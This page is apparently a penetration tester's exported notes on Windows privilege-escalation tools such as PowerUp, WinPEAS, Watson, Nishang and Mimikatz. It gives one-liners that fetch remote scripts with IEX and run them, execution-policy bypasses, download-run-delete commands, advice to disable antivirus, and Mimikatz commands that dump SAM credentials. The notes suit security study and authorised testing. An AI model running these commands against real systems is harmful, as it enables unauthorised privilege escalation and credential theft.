<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Tools</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Tools</h1><br/><strong><h3>Tools for common privilege escalation misconfigurations</h3></strong><br />• <strong>PowerUp.ps1</strong> from PowerSploit in the PrivEsc category: <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a><br />    <span style="color:#a5452a;">execute all checks:</span><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 &#39;</span>);<span style="color:#00117f;font-weight:400">Invoke-AllChecks</span> <span style="color:#ff9d00;font-weight:700">-</span>HTMLReport</pre></div><br />    OPTIONS:<br />    -HTMLReport → save all results to an HTML file in the actual folder<br />    <a href=""><img src="images/1278-1.png" alt="images/1278-1.png" /></a><br />   ◇ to load from shell<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> powershell.exe -exec bypass -Command <span style="color:#3ad900;font-weight:400">&quot;&amp; {Import-Module .\PowerUp.ps1; Invoke-AllChecks}&quot;</span></pre></div><br />        <a href=""><img src="images/1278-2.png" alt="images/1278-2.png" /></a><br />        <br />• <strong>WinPEAS</strong>: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><br />    Before running, we need to add a registry key and then reopen the command prompt:<br />    Link raw exe(any): <a href="https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe">https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />    Link bat: <a href="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat">https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg add HKCU<span style="color:#ff9d00;font-weight:700">\</span>Console <span style="color:#ff9d00;font-weight:700">/</span>v VirtualTerminalLevel <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span>  <span style="color:#0088ff;font-weight:400">#then restart the command prompt</span></pre></div><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>winPEASany.exe quiet cmd fast           <span style="color:#0088ff;font-weight:400">#Run all checks while avoiding time consuming searches</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>winPEASany.exe quiet cmd systeminfo     <span style="color:#0088ff;font-weight:400">#Run specific check categories</span></pre></div><br />    <a href=""><img src="images/1278-3.png" alt="images/1278-3.png" /></a><br />    To run it from meterpreter<br />    <div class="codebox"><pre>meterpreter&gt; shell<br />C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; winPEAS.bat quiet cmd fast</pre></div><br />    <a href=""><img src="images/1278-4.png" alt="images/1278-4.png" /></a><br /><br />• <strong>Privesc.ps1</strong>: <a href="https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1">https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1</a><strong><br />    </strong><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1 &#39;</span>);<span style="color:#00117f;font-weight:400">Invoke-PrivEsc</span></pre></div><br />   ◇ To load from shell:<br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> powershell.exe -exec bypass -Command <span style="color:#3ad900;font-weight:400">&quot;&amp; {Import-Module .\privesc.ps1;Invoke-PrivEsc}&quot;</span></pre></div><br />        <a href=""><img src="images/1278-5.png" alt="images/1278-5.png" /></a><br /><br />• <strong>BeRoot</strong>: <a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a><br />    Available for:<br />   ◇ Linux and MacOS in <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">python</a><br />   ◇ Windows in<br />      ▪  <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Windows">python</a><br />      ▪  <a href="https://github.com/AlessandroZ/BeRoot/releases">Compiled</a><br />        Powershell one-line that use the Compiled(.exe) version.We can use it on Powershell 2.0 and newer because use Shell.Application Class<br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/AlessandroZ/BeRoot/releases/download/1.0.1/beRoot.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\beRoot.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\beRoot.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\beRoot.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\beRoot.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\beRoot.zip&quot;</span>;</pre></div><br />•<strong> Watson:</strong> <a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a><br />    Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.<br />    Supported Windows Versions<br />      ▪ Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004<br />      ▪ Server 2016 &amp; 2019<br />     <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Watson.exe&quot;</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Watson.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Watson.exe&quot;</span></pre></div><br />     <a href="https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe">https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe</a><br />     <span style="text-decoration:underline;">How to Compile</span>:<br />     <strong>Compile Watson</strong><br />   1) Download the zip file from the Github page<br />   2) Open the SLN file (structure file used for organizing projects) with Microsoft Visual Studio<br />       <a href=""><img src="images/1278-6.png" alt="images/1278-6.png" /></a><br />   3) Turn off AV and Compile Watson by clicking on the Start button of Visual Studio<br />       <a href=""><img src="images/1278-7.png" alt="images/1278-7.png" /></a><br />       Watson.exe will be created in the folder ..Watson-master\Watson\bin\Debug\<br />   4) Upload Watson.exe on the target machine. <a href="https://github.com/DenFox93/Compiled-programs">Here you can find a compiled version in date 31/01/2021</a><br />        <a href=""><img src="images/1278-8.png" alt="images/1278-8.png" /></a><br />        <a href=""><img src="images/1278-9.png" alt="images/1278-9.png" /></a><br />        <span style="color:#ff0000;">Could give this error: </span><br />        <a href=""><img src="images/1278-10.png" alt="images/1278-10.png" /></a><br />• <strong>Nishang</strong>: <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1&#39;</span>);<span style="color:#00117f;font-weight:400">get-information</span></pre></div><br /><br />• <strong>Mimikatz</strong>: to dump credentials, check the chapter about <a href="ge_Escalation--Windows_Privilege_Escalation--4._Passwords--Dump_&_Crack_the_Hashes--Passowrds_Dumping_Tools--Remotely--mimikatz_(Windows).html">Passwords → Dump &amp; Crack Hashes</a><br />    <div class="codebox"><pre>mimikatz# privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />mimikatz# lsadump<span style="color:#ff9d00;font-weight:700">::</span>sam</pre></div><br /><br /><strong><h3>Tools that provides informations for further investigations</h3></strong><br />Tools that does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.<br /><strong>• Seatbelt</strong><br />   ◇ Code: <a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a><br />   ◇ Pre-Compiled: <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe</a><br />   <div class="codebox"><pre>PS&gt; .<span style="color:#333333;font-weight:400">\S</span>eatbelt.exe</pre></div><br />   <a href=""><img src="images/1278-11.png" alt="images/1278-11.png" /></a><br /><strong>• Accesschk</strong>: <a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a><br />    You can use it to check whether a user or group has access to files, directories, services, and registry keys.<br />   ◇ <span style="text-decoration:underline;">GUI:</span>  more recent versions of the program spawn a GUI “accept EULA” popup window. So we can use them only via GUI<br />   ◇ <span style="text-decoration:underline;">command line:</span> older version of accesschk can be used with the command line, which still has an /accepteula command line option.<br />   <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">new-object</span> System.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>);<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;<span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\&quot;</span>;[<span style="color:#7f0044;font-weight:400">void</span>] (<span style="color:#ff9d00;font-weight:700">New-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#0088ff;font-weight:400">$DestinationFolder</span> <span style="color:#ff9d00;font-weight:700">-</span>ItemType Directory <span style="color:#ff9d00;font-weight:700">-</span>Force);<span style="color:#0088ff;font-weight:400">$Shell</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">new-object</span> <span style="color:#ff9d00;font-weight:700">-</span>com Shell.Application;<span style="color:#0088ff;font-weight:400">$Shell</span>.Namespace(<span style="color:#0088ff;font-weight:400">$DestinationFolder</span>).copyhere(<span style="color:#0088ff;font-weight:400">$Shell</span>.NameSpace(<span style="color:#0088ff;font-weight:400">$ZippedFilePath</span>).Items(),<span style="color:#333333;font-weight:400">4</span>);<span style="color:#ff9d00;font-weight:700">Invoke-Expression</span> <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\accesschk.exe /accepteula -uwdq C:\&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.exe&quot;</span>;<span style="color:#ff9d00;font-weight:700">Remove-Item</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\Accesschk.zip&quot;</span>;</pre></div><br />   in the example above we have executed an Accesschk.exe command to check for write permissions in C:\ but we can use it also for more other things<br />       <br /><br /></div>
</body>
</html>
